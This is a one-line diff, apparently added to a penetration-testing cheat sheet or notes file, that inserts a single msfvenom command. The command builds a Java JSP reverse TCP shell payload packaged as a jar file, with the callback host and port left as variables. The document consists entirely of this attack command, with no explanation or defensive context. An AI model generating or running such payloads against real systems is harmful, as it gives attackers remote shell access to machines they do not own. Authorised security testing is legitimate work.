@@ -1,0 +1,1 @@
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f jar > reverse.jar
